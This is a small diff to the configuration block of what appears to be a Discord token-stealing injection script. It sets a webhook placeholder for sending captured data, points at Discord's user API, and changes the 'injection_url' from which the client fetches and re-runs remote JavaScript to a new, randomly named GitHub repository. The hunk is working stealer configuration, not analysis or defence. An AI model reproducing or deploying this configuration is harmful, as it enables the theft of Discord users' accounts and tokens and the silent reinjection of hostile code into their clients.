@@ -12,7 +12,7 @@ const config = {
   embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), 
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK_LINK%", //your discord webhook there obviously
-  injection_url: 'https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/jbq9/dfdfdsdfsdsdfdfdsdsdsfsdfsdf/main/g.js', //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
